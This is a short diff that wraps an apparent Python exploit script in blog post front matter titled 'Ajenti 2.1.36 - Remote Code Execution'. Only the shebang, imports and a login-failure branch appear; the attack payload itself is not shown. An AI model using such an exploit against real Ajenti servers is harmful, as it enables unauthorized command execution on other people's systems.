@@ -1,4 +1,13 @@
- #!/usr/bin/python3
+---
+layout: post
+title: "Ajenti 2.1.36 - Remote Code Execution"
+date: 2024-05-25
+category: exploit
+---
+
+##
+
+#!/usr/bin/python3
 
 import requests
 import sys
@@ -51,4 +60,3 @@ if username in login.text:
 else:
     print("[-] Wrong credentials or may the system patched.")
     exit()
-            
